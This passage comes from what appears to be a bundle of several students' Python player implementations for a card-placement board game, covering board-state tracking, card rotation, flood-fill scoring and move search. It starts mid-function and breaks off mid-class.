            if ([radky,sloupce] not in nechod) and (hraci_pole[radky][sloupce] != 0):
                used.append([radky,sloupce])
            else:
                continue
            barva = hraci_pole[radky][sloupce]
            magazine.append([radky,sloupce])
            smery = [(1,0),(-1,0),(0,1),(0,-1)]
            while len(magazine)!= 0:
                if magazine[0] not in used:
                    used.append(magazine[0])
                for i in smery:
                    if (i[0] == -1) or (i[1] == -1):
                        if (magazine[0][0] + i[0] < 0) or (magazine[0][1] + i[1] < 0):
                            continue
                        else:
                            if i[0] == -1:
                                if hraci_pole[magazine[0][0] + i[0]][magazine[0][1]] == barva:
                                    a = [magazine[0][0]+i[0],magazine[0][1]]
                                    if a not in used:
                                        magazine.append(a)
                            else:
                                if hraci_pole[magazine[0][0]][magazine[0][1]+i[1]] == barva:
                                    a = [magazine[0][0],magazine[0][1]+i[1]]
                                    if a not in used:
                                        magazine.append(a)
                    else:
                        if (magazine[0][0] + i[0] >= len(pole)) or (magazine[0][1] + i[1] >= len(pole[0])):
                            continue
                        else:
                            if i[0] == 1:
                                if hraci_pole[magazine[0][0] + i[0]][magazine[0][1]] == barva:
                                    a = [magazine[0][0]+i[0],magazine[0][1]]
                                    if a not in used:
                                        magazine.append(a)
                            else:
                                if hraci_pole[magazine[0][0]][magazine[0][1]+i[1]] == barva:
                                    a = [magazine[0][0],magazine[0][1]+i[1]]
                                    if a not in used:
                                        magazine.append(a)
                magazine.pop(0)

            nice = False
            for q in used:
                if not q in jsem_v_karte:
                    nice = True
                nechod.append(q)
            if nice:
                body += len(used)
            else:
                continue
    return body
                
def find_me_place(koukni,origo_karta:list,pole:list):
    #pole = do_2D_copy(hraci_pole)
    '''
    Vstup = 2D pole karty a 2D hraci pole
    Vystup = nejlepsi mozna zahratelna pozice
    '''
    #karta = do_2D_copy(origo_karta)
    karta = origo_karta
    # if koukni[0] - len(karta) < 0:
    #     zacni0 = 0
    # else:
    #     zacni0 = koukni[0] - len(karta)
    # if koukni[1] - len(karta[0]) < 0:
    #     zacni1 = 0
    # else:
    #     zacni1 = koukni[1] - len(karta[0])
    # if koukni[2] + len(karta) > len(pole):
    #     zacni2 = len(pole) - len(karta)
    # else:
    #     zacni2 = koukni[2] + len(karta)
    # if koukni[3] + len(karta[0]) > len(pole[0]):
    #     zacni3 = len(pole[0]) - len(karta[0])
    # else:
    #     zacni3 = koukni[3] + len(karta[0])
    nejvetsi = -1
    for radky in range((len(pole)-len(karta)+1)):
        for sloupce in range((len(pole[0])-len(karta[0])+1)):
    # for radky in range(zacni0,zacni2):
    #     for sloupce in range(zacni1,zacni3):
            if pole[radky][sloupce] == -1:
                fill_in = try_fill_in(radky,sloupce,karta,pole)
                if fill_in:
                    bodiky = get_points(radky,sloupce,karta,pole)
                    if bodiky > nejvetsi:
                        nejvetsi = bodiky
                        f_karta = origo_karta
                        f_radek = radky
                        f_sloupec = sloupce
                        f_bodiky = nejvetsi
                else:
                    continue
    if nejvetsi == -1:
        return -1,-1,-1,-1
    else:
        return f_bodiky,f_radek,f_sloupec,f_karta
    
def poloz_kartu(radek,sloupec,karta,pole):
    opakovani = 0
    for i in range(radek,(radek + len(karta))):
        pole[i][sloupec:(sloupec + len(karta[0]))] = karta[opakovani]
        opakovani += 1
    
class Player(BASE.BasePlayer):
    
    def __init__(self, login, boardRows, boardCols, cardsAtHand):
        super().__init__(login, boardRows, boardCols, cardsAtHand)
        self.playerName = "D0MDi"
        self.cardsAtHand = karty_v_ruce(self.cardsAtHand)
        self.kouknout = [0,0,boardRows - 1,boardCols-1]
        self.pouzite = []
        # self.min_radek = 0
        # self.max_radek = boardRows - 1
        # self.min_sloupec = 0
        # self.max_sloupec = boardCols - 1
        self.hraci_pole = vytvor_hraci_pole(boardRows,boardCols)

    
    def play(self,newCardOnDesk):
        """ this method is called during the game. 
            The input argument newCardOnDesk is:
            - [] if other player didn't place any card in his move), or
            - [row, col, cardMatrix], which informs your player that cardMatrix was placed at row,col to the game board
            
            Return value: 
            - [ row, col, cardMatrix ] if you want to place a card, or
            - [] if no card can be placed 
        """
        # DebugPrint(self.hraci_pole)
        # if self.tournament:
        #         if len(self.cardsOnDesk) == 0 and newCardOnDesk == []:
        #             cardindx = random.randint(0, len(self.cardsAtHand)-1)  #random index of a card
        #             card = self.cardsAtHand[cardindx]
        #             cardRows = len(card)
        #             cardCols = len(card[0])
        #             row = random.randint(0, self.boardRows-cardRows-1) 
        #             col = random.randint(0, self.boardCols-cardCols-1)
        #             for i in range(4):
        #                 odebrani = (4*(cardindx//4)) + i
        #                 self.cardsAtHand.pop(odebrani)
        #             #remove selected card so its not used in future
        #             self.cardsOnDesk += [ [row, col, card ] ]
        #             self.kouknout = [row,col,row + len(card),col + len(card[0])]
        #             poloz_kartu(row,col,card,self.hraci_pole)
        #             # self.min_radek = row
        #             # self.min_sloupec = col
        #             # self.max_radek = row + len(card)
        #             # self.max_sloupec = col + len(card[0])
        #             return [row, col, card ]
        #         else:
        #             if newCardOnDesk == []:
        #                 pass
        #             else:
        #                 poloz_kartu(newCardOnDesk[0],newCardOnDesk[1],newCardOnDesk[2],self.hraci_pole)
        #                 if newCardOnDesk[0] < self.kouknout[0]:
        #                     self.kouknout[0] = newCardOnDesk[0]
        #                 if newCardOnDesk[1] < self.kouknout[1]:
        #                     self.kouknout[1] = newCardOnDesk[1]
        #                 if newCardOnDesk[0]+len(newCardOnDesk[2]) > self.kouknout[2]:
        #                     self.kouknout[2] = newCardOnDesk[0]+len(newCardOnDesk[2])
        #                 if newCardOnDesk[1]+len(newCardOnDesk[2][0]) > self.kouknout[3]:
        #                     self.kouknout[3] = newCardOnDesk[1]+len(newCardOnDesk[2][0])
        #             if len(self.cardsAtHand) == 0:
        #                 return []
        #             else:
        #                 for i in range(len(self.cardsAtHand)):
        #                     karta = self.cardsAtHand[i]
        #                     d_body,row,col,card = find_me_place(self.kouknout,karta,self.hraci_pole)
        #                     index = i
        #                     if d_body >= 0:
        #                         odebrani = (4*(index//4))
        #                         for j in range(4):
        #                             odebrani = odebrani + j
        #                             print(len(self.cardsAtHand))
        #                             print(odebrani)
        #                             self.cardsAtHand.pop(odebrani)
        #                         #remove selected card so its not used in future
        #                         self.cardsOnDesk += [ [row, col, card ] ]
        #                         self.kouknout = [row,col,row + len(card),col + len(card[0])]
        #                         poloz_kartu(row,col,card,self.hraci_pole)
        #                         return [row,col,card]
        #                 return []
        # else:
            
        


        if len(self.cardsOnDesk) == 0 and newCardOnDesk == []:
            card = self.cardsAtHand[0]
            row = self.boardRows//2 
            col = self.boardCols//2
            index = 0
            for i in range(4):
                odebrani = index + i
                self.pouzite.append(odebrani)
            self.cardsOnDesk += [ [row, col, card ] ]
            poloz_kartu(row,col,card,self.hraci_pole)
            return [ row,col,card ]
        else:
            if newCardOnDesk != []:
                poloz_kartu(newCardOnDesk[0],newCardOnDesk[1],newCardOnDesk[2],self.hraci_pole)
            for index in range(len(self.cardsAtHand)):
                if index in self.pouzite:
                    continue
                karta = self.cardsAtHand[index]
                d_body,d_radek,d_sloupec = find_me_place_easy(karta,self.hraci_pole)
                d_index = 4*(index//4)
                if d_body > -1:
                    for i in range(4):
                        odebrani = d_index + i
                        self.pouzite.append(odebrani)
                    poloz_kartu(d_radek,d_sloupec,karta,self.hraci_pole)
                    self.cardsOnDesk += [[d_radek,d_sloupec,karta]]
                    return[ d_radek,d_sloupec,karta]
            return []





                

    
    


        #recommened steps 
        #step 0: write newCardOnDesk to list of cards that are on the board game
        #step 1: compute all possible placement of your all (so for available) cards
        #step 2: evaluate each placement, i.e., compute score for it
        #step 3: select card that you want to place to the game board, mark it as used (not available in future)
        #step 4: return your placement, or [] if no placement can be made
        #the following code DOES NOT provides correct moves, 
        #it just return random card at random position

        # if len(newCardOnDesk) == 3:
        #     self.cardsOnDesk += [ newCardOnDesk ]

        # if len(self.cardsAtHand) == 0:
        #     return []

        # cardindx = random.randint(0, len(self.cardsAtHand)-1)  #random index of a card
        # card = self.cardsAtHand[cardindx]
        # cardRows = len(card)
        # cardCols = len(card[0])
        # row = random.randint(0, self.boardRows-cardRows-1) 
        # col = random.randint(0, self.boardCols-cardCols-1)
        # self.cardsAtHand = self.cardsAtHand[:cardindx] + self.cardsAtHand[cardindx+1:]  #remove selected card so its not used in future
        # self.cardsOnDesk += [ [row, col, card ] ]
        # return [row, col, card ]


# if __name__ == "__main__":
#     """ when you run:
#         python3 player.py

#         you should get set of .png files with the progress of the game
#     """

#     tmp = [C44a, C44b, C33a, C33c, C53c, C53b]*1

#     p1 = Player("testA", 19, 23, tmp)
#     p2 = Player("testB", 19, 23, tmp)

#     p2move = []
#     gameStep = 0
#     while True:
#         p1move = p1.play(p2move)
#         print("p1 returned", p1move)
#         p1.drawCards(p1.boardRows, p1.boardCols, p1.cardsOnDesk,"move-{:02}b-A.png".format(gameStep))
#         p2move = p2.play(p1move)    
#         print("p2 returned", p2move)
#         p2.drawCards(p2.boardRows, p2.boardCols, p2.cardsOnDesk,"move-{:02}b-B.png".format(gameStep))
#         if p1move == [] and p2move == []:
#             print("end of game")
#             quit()
#         gameStep += 1


    prokema4
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/src-processed/prokema4______________________
        player.py
import base as BASE
import copy, random, time, sys, os
from PIL import Image, ImageDraw


#basic cards with colors 1 and 2
#note that Brute can provide you also other cards!
C44a = [ [0,1,2,0], 
         [1,1,2,2],
         [2,2,1,1],
         [0,2,1,0] ]  

C44b = [ [0,0,1,0], 
         [1,1,1,0],
         [0,2,2,2],
         [0,2,0,0] ] 

C53b = [ [0,1,0], 
         [0,1,0],
         [0,1,0],
         [0,1,1],
         [0,0,0] ]

C53c = [ [0,1,0], 
         [0,1,0],
         [0,1,1],
         [0,2,2],
         [0,2,0] ]

C33a = [ [0,1,0], 
         [1,1,2],
         [0,0,2] ]

C33c = [ [1,2,1], 
         [2,2,2], 
         [1,2,1] ]

C33d = [ [3,0,0],
         [0,0,0],
         [0,0,3]]


class Player(BASE.BasePlayer):
    def __init__(self, login, boardRows, boardCols, cardsAtHand):
        super().__init__(login, boardRows, boardCols, cardsAtHand)
        self.playerName = "My awesome player"
        self.board = []
        self.empty_space = 7
        self.login = login
        self.init_board()

    def init_board(self):
        for r in range(self.boardRows):
            self.board.append([])
            for c in range(self.boardCols):
                self.board[r].append(self.empty_space)
        # print('BOARD INITIALIZED')

    def insert_card(self,card,board):
        r_s = card[0]
        c_s = card[1]
        # print('inserting card...',card)
        for r in range(0,len(card[2])):
            for c in range(0,len(card[2][0])):
                board[r_s+r][c_s+c] = card[2][r][c]

        return board

    def generate_histogram(self,input_matrix,matrix_rows,matrix_cols):
        hist = []
        for row in range(matrix_rows):
            hist.append([])
            for col in range(matrix_cols):
                hist[row].append(0)

        for row in range(matrix_rows):
            for col in range(matrix_cols):
                if row == 0:
                    if input_matrix[row][col] == self.empty_space:
                        hist[row][col] = 1
                    else:
                        hist[row][col] = 0
                else:
                    if input_matrix[row][col] == self.empty_space:
                        hist[row][col] += hist[row-1][col]+ 1
                    else:
                        hist[row][col] = 0
        return hist

    def check_border(self,card,card_row,card_col,board):
        card_width = len(card[0])  # Width corresponds to the number of columns
        card_height = len(card)   # Height corresponds to the number of rows
        
        # Check above and below the card
        for c in range(card_col, card_col + card_width-1):
            # Above
            # print(card_row-1)
            if card_row - 1 >= 0 and board[card_row - 1][c] != self.empty_space:
                return True
            
            # Below
            if card_row + card_height < self.boardRows and board[card_row + card_height][c] != self.empty_space:
                return True

        # Check left and right of the card
        for r in range(card_row, card_row + card_height-1):
            # Left
            if card_col - 1 >= 0 and board[r][card_col - 1] != self.empty_space:
                return True

            # Right
            if card_col + card_width < self.boardCols and board[r][card_col + card_width] != self.empty_space:
                return True

        # If no neighboring non-empty spaces are found, return False
        return False


    def find_groove(self,histogram,card,board):
        cur_width = 0
        card_height = len(card)
        card_width = len(card[0])

        for line_idx in range(card_height-1,self.boardRows):
            for col_idx in range(0,self.boardCols):
                if histogram[line_idx][col_idx] >= card_height:
                    cur_width += 1
                else:
                    cur_width = 0

                if cur_width >= card_width:
                    card_row = line_idx-card_height+1
                    card_col = col_idx-card_width+1
                    # print('found space at',card_row,card_col)

                    # card.insert_card(board)
                    # for line in board:
                    #     print(line)
                    # print()
                    # card.remove_card(board)

                    if self.check_border(card,card_row,card_col,board):
                        # print('found neigh')
                        # print(card_row,card_col)
                        card_row = line_idx-card_height+1
                        card_col = col_idx-card_width+1
                        return card_row,card_col

            cur_width = 0
        return False

    def rotate_card(self,card):
        card = [list(row) for row in zip(*card[::-1])]
        return card

    def play(self,newCardOnDesk):
        rot = 0
        tested_cards = []
        # self.board = self.insert_card([15,3,self.cardsAtHand[0]],self.board)
        # self.cardsOnDesk += [ [15, 3, self.cardsAtHand[0] ] ]
        print(self.cardsAtHand)


        if len(newCardOnDesk) == 3:
            # zaznamenej souperuv tah
            self.cardsOnDesk += [ newCardOnDesk ]
            # print('newCardOnDesk',newCardOnDesk)
            self.board = self.insert_card(newCardOnDesk,self.board)
        
        if len(self.cardsOnDesk) == 0:
            # print('playing first')
            cardindx = random.randint(0, len(self.cardsAtHand)-1)  #random index of a card
            card = self.cardsAtHand[cardindx]
            cardRows = len(card)
            cardCols = len(card[0])
            row = random.randint(0, self.boardRows-cardRows-1) 
            col = random.randint(0, self.boardCols-cardCols-1)
            self.cardsAtHand = self.cardsAtHand[:cardindx] + self.cardsAtHand[cardindx+1:]
            #remove selected card so its not used in future
            self.board = self.insert_card([row,col,card],self.board)
            self.cardsOnDesk += [ [row, col, card ] ]

            return [row, col, card ]

        histogram = self.generate_histogram(self.board,self.boardRows, self.boardCols)
        
        for cardindx in range(len(self.cardsAtHand)):
            card = self.cardsAtHand[cardindx]
            
            pos = self.find_groove(histogram,card,self.board)

            if pos:
                row, col = pos[0],pos[1]
                self.cardsAtHand = self.cardsAtHand[:cardindx] + self.cardsAtHand[cardindx+1:]
                self.cardsOnDesk += [ [row, col, card ] ]
                self.board = self.insert_card([row,col,card],self.board)

                return [row, col, card ]

            elif rot < 4:
                # ROTATE CARD
                card = self.rotate_card(card)
                rot += 1 
            else:
                card = self.rotate_card(card)

        return []



if __name__ == "__main__":
    """ when you run:
        python3 player.py

        you should get set of .png files with the progress of the game
    """

    tmp = [C44a, C44b, C33a,C33c,C33d, C53c, C53b]*1

    br = 12
    bc = 12
    p1 = Player("testA", br, bc, tmp)
    p2 = Player("testB", br, bc, tmp)
    # p1 = Player("testA", 19, 23, tmp)
    # p2 = Player("testB", 19, 23, tmp)

    p2move = []
    gameStep = 0

    while True:
        p1move = p1.play(p2move)
        print("p1 returned", p1move)
        p1.drawCards(p1.boardRows, p1.boardCols, p1.cardsOnDesk,"move-{:02}b-A.png".format(gameStep))



        p2move = p2.play(p1move)    
        print("p2 returned", p2move)
        p2.drawCards(p2.boardRows, p2.boardCols, p2.cardsOnDesk,"move-{:02}b-B.png".format(gameStep))

        gameStep += 1
        if p1move == [] and p2move == []:
            print("end of game")
            quit()


    sternond
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/src-processed/sternond______________________
        player.py
import base as BASE
import copy, random, time, sys, os
from PIL import Image, ImageDraw

def ctO(a,b,field,rows,columns):
    if a !=0 and field[a-1][b] == "*":
        N = [a-1,b]
    else: N = False
    if a != rows-1 and field[a+1][b] == "*":
        S = [a+1,b]
    else: S = False
    if b != 0 and field[a][b-1] == "*":
        W = [a,b-1]
    else: W = False
    if b != columns-1 and field[a][b+1] == "*":
        E = [a,b+1]
    else: E = False
    okoli = [N,S,W,E]
    return okoli
def possiblePositions(mat,rows,columns):
    szn = []
    for a in range(rows):
        for b in range(columns):
            if mat[a][b] != "*":
                for o in ctO(a,b,mat,rows,columns):
                    if o and o not in szn:
                        szn.append([o,o[0]-a,o[1]-b])
    return szn

def rotMat(matice):
    row = len(matice[0])
    column = len(matice)
    otmat = [["*"]*column for _ in range(row)]
    for s in range(column):
        for r in range(row):
            otmat[r][s] = matice[column-(s+1)][r]
    return otmat

def pMat(mat):
    for i in mat:
        print(i)
    print()

def shortcut(startr,startc,rows,columns,karta,field):
    hpole = copy.deepcopy(field)
    matPlace(startr,startc,rows,columns,karta,hpole)
    return score(startr,startc,rows,columns,hpole)

def matPlace(startr,startc,rows,columns,karta,pole):
    for r in range(startr,rows+startr):
        for s in range(startc,columns+startc):
            pole[r][s] = str(karta[r-startr][s-startc])

def checkSpace(pole,start,rows,columns):
    for a in range(start[0],start[0]+rows):
        for b in range(start[1],start[1]+columns):
            if pole[a][b] != "*":
                return False
    return True

def score(startr,startc,rows,columns,pole):
    checked = []
    stack = []
    score = 0
    for a in range(startr,rows+startr):
        for b in range(startc,columns+startc):
            if pole[a][b] != "0" and [a,b] not in checked:
                tbf = pole[a][b]
                stack.append([a,b])
                tempscore =1
                boul = False
                while stack:
                    checked.append(stack.pop())
                    for i in range(-1,2,2):
                        if ((checked[-1][0] !=0 and i ==-1 ) or (checked[-1][0] !=len(pole)-1 and i ==1)) and pole[checked[-1][0]+i][checked[-1][1]]==tbf and [checked[-1][0]+i,checked[-1][1]] not in checked:
                            if [checked[-1][0]+i,checked[-1][1]] not in stack:
                                stack.append([checked[-1][0]+i,checked[-1][1]])
                                tempscore +=1
                        if ((checked[-1][1] !=0 and i == -1) or (checked[-1][1] != len(pole[0])-1 and i == 1)) and pole[checked[-1][0]][checked[-1][1]+i] == tbf and [checked[-1][0],checked[-1][1]+i]not in checked:
                            if [checked[-1][0],checked[-1][1]+i] not in stack:
                                stack.append([checked[-1][0],checked[-1][1]+i])
                                tempscore +=1
                        if checked[-1][0]<startr or checked[-1][1]<startc or checked[-1][0]>=startr+rows or checked[-1][1]>=startc+columns:
                            boul = True
                if boul: score += tempscore
    return score

def stockfish(cards,field,tl):
    pp = possiblePositions(field,len(field),len(field[0]))
    mscore = float("-inf")
    for rot in range(4):
        ind = 0
        while ind < len(cards):
            if time.time()-tl> 1.3: return winner
            karta = cards[ind]
            while rot >0:
                karta = rotMat(karta)
                rot -= 1
            rows = len(karta)
            columns = len(karta[0])
            pos = {}
            inder = 0
            while inder< len(pp):
                p = pp[inder]
                if p[1] <0:
                    if rows-1 <=p[0][0]:
                        s2 = p[0][1]-columns+1
                        if s2<0:
                            s2 = 0
                        s2copy = s2
                        while s2+columns<len(field[0])+1 and s2copy-s2>-columns:
                            start = [p[0][0]-rows+1,s2]
                            if tuple(start) in pos: 
                                s2 +=1
                                continue
                            pos[tuple(start)] = True
                            if checkSpace(field,start,rows,columns):
                                okscore = shortcut(start[0],start[1],rows,columns,karta,field)
                                if okscore>mscore:
                                    mscore = okscore
                                    winner = {}
                                    winner["start"] = start
                                    winner["karta"] = karta
                            s2+=1
                    #zdola
                elif p[1]>0:
                    if rows <=len(field)-p[0][0]:
                        s2 = p[0][1]-columns+1
                        if s2<0:
                            s2 = 0
                        s2copy = s2
                        while s2+columns<len(field[0])+1 and s2copy-s2>-columns:
                            start = [p[0][0],s2]
                            if tuple(start) in pos: 
                                s2+=1
                                continue
                            pos[tuple(start)] = True
                            if checkSpace(field,start,rows,columns):
                                okscore = shortcut(start[0],start[1],rows,columns,karta,field)
                                if okscore>mscore:
                                    mscore = okscore
                                    winner = {}
                                    winner["start"] = start
                                    winner["karta"] = karta
                            s2+=1
                    #shora
                elif p[2] <0:
                    if columns-1 <=p[0][1]:
                        s1 = p[0][0]-rows+1
                        if s1<0:
                            s1 = 0
                        s1copy = s1
                        while s1+rows<len(field)+1 and s1copy-s1>-rows:
                            start = [s1,p[0][1]-columns+1]
                            if tuple(start) in pos: 
                                s1+=1
                                continue
                            pos[tuple(start)] = True
                            if checkSpace(field,start,rows,columns):
                                okscore = shortcut(start[0],start[1],rows,columns,karta,field)
                                if okscore>mscore:
                                    mscore = okscore
                                    winner = {}
                                    winner["start"] = start
                                    winner["karta"] = karta
                            s1+=1
                    #zprava
                elif columns <=len(field[0])-p[0][1]:
                    s1 = p[0][0]-rows+1
                    if s1<0:
                        s1 = 0
                    s1copy = s1
                    while s1+rows<len(field)+1 and s1copy-s1>-rows:
                        start = [s1,p[0][1]]
                        if tuple(start) in pos: 
                            s1+=1
                            continue
                        pos[tuple(start)] = True
                        if checkSpace(field,start,rows,columns):
                            okscore = shortcut(start[0],start[1],rows,columns,karta,field)
                            if okscore>mscore:
                                mscore = okscore
                                winner = {}
                                winner["start"] = start
                                winner["karta"] = karta
                        s1 += 1
                    #zleva
                inder += 1
            ind+=1
        #if time.time()-tl> 1.3: return winner
    if mscore >-1:
        winner["mscore"] = mscore
        return winner
    else: return {}

class Player(BASE.BasePlayer):
    def __init__(self, login, boardRows, boardCols, cardsAtHand):
        super().__init__(login, boardRows, boardCols, cardsAtHand)
        self.playerName = "McShtreka(r with caron)"
    def play(self,newCardOnDesk):
        tl = time.time()
        if len(newCardOnDesk) == 3:
            self.cardsOnDesk += [ newCardOnDesk ]
        if len(self.cardsAtHand) == 0:
            return []
        pole = [["*"]*self.boardCols for _ in range(self.boardRows)]
        for karta in self.cardsOnDesk:
            matPlace(karta[0],karta[1],len(karta[2]),len(karta[2][0]),karta[2],pole)
        if  not self.cardsOnDesk and len(newCardOnDesk) == 0:
            cardindx = random.randint(0, len(self.cardsAtHand)-1)  #random index of a card
            card = self.cardsAtHand[cardindx]
            for rot in range(random.randint(0,3)):
                card = rotMat(card)
            cardRows = len(card)
            cardCols = len(card[0])
            row = random.randint(0, self.boardRows-cardRows-1) 
            col = random.randint(0, self.boardCols-cardCols-1)
        else:
            informace = stockfish(self.cardsAtHand,pole,tl)
            if len(informace) == 0:
                return []
            card = informace["karta"]
            row = informace["start"][0]
            col = informace["start"][1]
            tempcard = card
            while tempcard not in self.cardsAtHand:
                tempcard = rotMat(tempcard)
            cardindx = self.cardsAtHand.index(tempcard)
        self.cardsAtHand = self.cardsAtHand[:cardindx] + self.cardsAtHand[cardindx+1:]  #remove selected card so its not used in future
        self.cardsOnDesk += [ [row, col, card ] ]
        return [row, col, card ]    fabiatad
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/src-processed/fabiatad______________________
        player.py
import base as BASE
import copy, random, time, sys, os


class Point:
    def __init__(self, y, x=None):
        if x is None:
            if isinstance(y, int):
                self.y = self.x = y
            else:
                self.y, self.x = y
        else:
            self.y = y
            self.x = x

    def __hash__(self):
        return hash((self.y, self.x))

    def __str__(self):
        return f'({self.y}, {self.x})'

    def __getitem__(self, i):
        return [self.y, self.x][i]

    def __iter__(self):
        return iter([self.y, self.x])

    def __len__(self):
        return 2

    def __add__(self, other):
        return Point(self.y + other[0], self.x + other[1])

    def __sub__(self, other):
        return Point(self.y - other[0], self.x - other[1])

    def shifted(self, n):
        return Point(self.y + n, self.x + n)

    def __eq__(self, other):
        return self.y == other[0] and self.x == other[1]

    def in_range(self, from_p, to_p):
        if from_p.y <= self.y <= to_p.y and from_p.x <= self.x <= to_p.x:
            return True
        return False

    def neighbors(self):
        return [Point(self.y - 1, self.x), Point(self.y + 1, self.x), Point(self.y, self.x - 1),
                Point(self.y, self.x + 1)]
        # offsets = [(0, -1), (0, 1), (-1, 0), (1, 0)]
        # return [self + Point(offset) for offset in offsets]

        # runs 5 seconds faster

    def transposed(self):
        return Point(self.x, self.y)

    @staticmethod
    def frame(from_p, to_p):
        points = []
        for y in range(from_p.y, to_p.y + 1):
            points += [Point(y, from_p.x - 1), Point(y, to_p.x + 1)]
        for x in range(from_p.x, to_p.x + 1):
            points += [Point(from_p.y - 1, x), Point(to_p.y + 1, x)]
        return points

    @staticmethod
    def range(from_p, to_p):
        p = []
        for y in range(from_p.y, to_p.y + 1):
            for x in range(from_p.x, to_p.x + 1):
                p.append(Point(y, x))
        return p

    @staticmethod
    def origin():
        return Point(0, 0)


class Matrix:
    def __init__(self, matrix=None):
        self.matrix = copy.deepcopy(matrix)
        self.height = 0
        self.width = 0
        self.size = 0
        self.update_size()

    def __eq__(self, other):
        return self.matrix == other.matrix

    def __str__(self):
        lst = list(range(self.width))
        frmt = "{:>3}" * len(lst)
        txt = f'   {frmt.format(*lst)}\n'

        for i, line in enumerate(self.matrix):
            lst = [i] + ['x' if c is None else c for c in line]
            frmt = "{:>3}" * len(lst)
            txt += f'{frmt.format(*lst)}\n'
        return txt

    def __iter__(self):
        for y in range(self.height):
            for x in range(self.width):
                p = Point(y, x)
                yield p, self.get(p)

    def update_size(self):
        self.height = len(self.matrix)
        self.width = len(self.matrix[0])
        self.size = Point(self.height, self.width)

    def set(self, point: Point, v):
        self.matrix[point.y][point.x] = v

    def get(self, point: Point):
        return self.matrix[point.y][point.x]

    def contains(self, point: Point):
        return 0 <= point.y < self.height and 0 <= point.x < self.width

    def insert(self, point: Point, sub_matrix):
        for i in range(sub_matrix.height):
            y = point.y + i
            row = self.row(y)
            self.matrix[y] = row[:point.x] + sub_matrix.row(i) + row[point.x + sub_matrix.width:]

    def row(self, y):
        return self.matrix[y]

    def rotate(self):
        transformed = Matrix.empty(self.size.transposed())
        for p, v in self:
            transformed.set(p.transposed(), self.get(Point(-p.y - 1, p.x)))
        self.matrix = transformed.matrix
        self.update_size()

    def copy(self):
        return Matrix(copy.deepcopy(self.matrix))

    def flood_fill(self, p_0, fill=0):
        target = self.get(p_0)
        if fill == target: return []
        potential_path = [p_0]
        path = []
        while len(potential_path) != 0:
            p = potential_path.pop(0)
            if self.get(p) == target:
                self.set(p, fill)
                path.append(p)
                potential_path += [n for n in p.neighbors() if n.in_range(Point.origin(), self.size.shifted(-1))]
        return path

    def get_paths(self):
        paths = []
        self_copy = self.copy()
        for p, v in self_copy:
            path = self_copy.flood_fill(p, 0)
            if len(path) > 0:
                paths.append(path)
        return paths

    def is_symmetrical(self):
        matrix_copy = self.copy()
        matrix_copy.rotate()
        matrix_copy.rotate()
        return self == matrix_copy

    @staticmethod
    def empty(size, fill=None):
        return Matrix([[fill for _ in range(size.x)] for _ in range(size.y)])

    @staticmethod
    def from_list(l, fill=0, value=1):
        max_b = Point.origin()
        for p in l:
            if p.y >= max_b.y:
                max_b.y = p.y + 1
            if p.x >= max_b.x:
                max_b.x = p.x + 1
        m = Matrix.empty(max_b, fill)
        for p in l:
            m.set(p, value)
        return m


class Board:
    MIN_CARD_SIZE = 3
    MAX_CARD_SIZE = 5
    CARD_DIFF = MAX_CARD_SIZE - MIN_CARD_SIZE

    def __init__(self, size: Point):
        self.size = size
        self.is_empty = True

        self.matrix = Matrix.empty(size, -1)
        self.path_matrix = Matrix.empty(size)
        self.paths = []

        self.white_list = Matrix.empty(Point(Board.CARD_DIFF + 1), set())
        self.black_list = Matrix.empty(Point(Board.CARD_DIFF + 1), set())
        self.legal_moves = Matrix.empty(Point(Board.CARD_DIFF + 1), set())
        self.init_black_list()

    def init_black_list(self):
        list_types = Point.range(Point.origin(), Point(self.CARD_DIFF))
        for list_type in list_types:
            list_type_card_size = list_type + Point(self.MIN_CARD_SIZE)
            black_list_points = set()
            from_1 = Point(self.size.y - list_type_card_size.y + 1, 0)
            from_2 = Point(0, self.size.x - list_type_card_size.x + 1)
            black_list_points = black_list_points.union(set(Point.range(from_1, self.size.shifted(-1))))
            black_list_points = black_list_points.union(set(Point.range(from_2, self.size.shifted(-1))))
            self.black_list.set(list_type, black_list_points)

    def place_card(self, p_0: Point, card: Matrix, paths):
        self.is_empty = False
        self.matrix.insert(p_0, card)
        list_types = Point.range(Point.origin(), Point(self.CARD_DIFF))
        for list_type in list_types:
            list_type_card_size = list_type + Point(self.MIN_CARD_SIZE)

            from_p = (p_0 - list_type_card_size).shifted(1)
            to_p = (p_0 + card.size).shifted(-1)

            new_white_list_points = set(
                [p for p in Point.frame(from_p, to_p) if p.in_range(Point.origin(), self.size.shifted(-1))])
            new_black_list_points = set(
                [p for p in Point.range(from_p, to_p) if p.in_range(Point.origin(), self.size.shifted(-1))])

            old_white_list_points = self.white_list.get(list_type)
            old_black_list_points = self.black_list.get(list_type)

            white_list_points = old_white_list_points.union(new_white_list_points)
            black_list_points = old_black_list_points.union(new_black_list_points)

            self.white_list.set(list_type, white_list_points)
            self.black_list.set(list_type, black_list_points)

            legal_moves = white_list_points.difference(black_list_points)
            self.legal_moves.set(list_type, legal_moves)

        for path in paths:
            new_path = set([p + p_0 for p in path])
            for connected_path_idx in self.get_connected_paths(p_0, card, path):
                new_path = new_path.union(self.paths[connected_path_idx])
                self.paths[connected_path_idx] = set()

            self.paths.append(new_path)

        paths_old = self.paths
        self.paths = []
        for path in paths_old:
            if len(path) == 0: continue
            self.paths.append(path)
            for p in path:
                self.path_matrix.set(p, len(self.paths) - 1)

    def get_legal_moves(self, size):
        return list(self.legal_moves.get(size.shifted(-self.MIN_CARD_SIZE)))

    def get_starting_moves(self, size):
        all_points = Point.range(Point.origin(), self.size.shifted(-1))
        black_list_points = self.black_list.get(size.shifted(-self.MIN_CARD_SIZE))
        return list(set(all_points).difference(black_list_points))

    def get_connected_paths(self, p_0, card, path):
        if len(path) == 0: return []
        connected_paths = set()
        path_color = card.get(path[0])
        for p in path:
            for neighbor in (p_0 + p).neighbors():
                if not self.path_matrix.contains(neighbor) or path_color != self.matrix.get(neighbor): continue
                connected_path = self.path_matrix.get(neighbor)
                if connected_path is not None:
                    connected_paths.add(connected_path)
        return connected_paths

    def rank_card(self, p_0, card, paths):
        score = 0
        all_connected_paths = set()
        for path in paths:
            connected_paths = self.get_connected_paths(p_0, card, path)
            if len(connected_paths) == 0: continue
            score += len(path)
            all_connected_paths = all_connected_paths.union(connected_paths)
        for connected_path in all_connected_paths:
            score += len(self.paths[connected_path])
        return score


class Player(BASE.BasePlayer):
    def __init__(self, login, board_rows, board_cols, cards_at_hand):
        super().__init__(login, board_rows, board_cols, cards_at_hand)
        self.playerName = "Deep Blue"

        cards = []
        paths = []

